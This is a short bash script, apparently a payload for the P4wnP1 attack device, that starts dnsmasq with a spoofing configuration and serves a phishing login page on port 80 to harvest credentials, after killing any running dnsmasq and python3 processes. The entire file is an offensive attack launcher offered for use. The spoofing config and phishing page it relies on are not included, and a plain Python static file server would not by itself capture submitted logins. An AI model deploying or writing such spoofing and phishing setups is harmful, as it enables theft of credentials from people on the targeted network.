#!/bin/bash
# payloads/network/credsnarf_spoof.sh
######################################

### Description: DNS spoof + credential snarfing with basic HTTP phishing
### Requirements: dnsmasq, Python HTTP server, custom login page

PAYLOAD_NAME="credsnarf_spoof"
LOG_DIR="/opt/p4wnp1/logs"
WEB_ROOT="/opt/p4wnp1/www"
DNSMASQ_CONF="/opt/p4wnp1/config/${PAYLOAD_NAME}_dnsmasq.conf"

mkdir -p "$LOG_DIR"
mkdir -p "$WEB_ROOT"

pkill dnsmasq || true
pkill python3 || true

# Start DNS spoofing
if [ ! -f "$DNSMASQ_CONF" ]; then
  echo "[!] Missing config: $DNSMASQ_CONF"
  exit 1
fi

dnsmasq --conf-file="$DNSMASQ_CONF" --log-queries --log-facility="$LOG_DIR/${PAYLOAD_NAME}_dnsmasq.log" &

# Start phishing page server
cd "$WEB_ROOT"
python3 -m http.server 80 > "$LOG_DIR/${PAYLOAD_NAME}_web.log" 2>&1 &

echo "[+] CredSnarf spoof payload running. Logs in $LOG_DIR"

exit 0
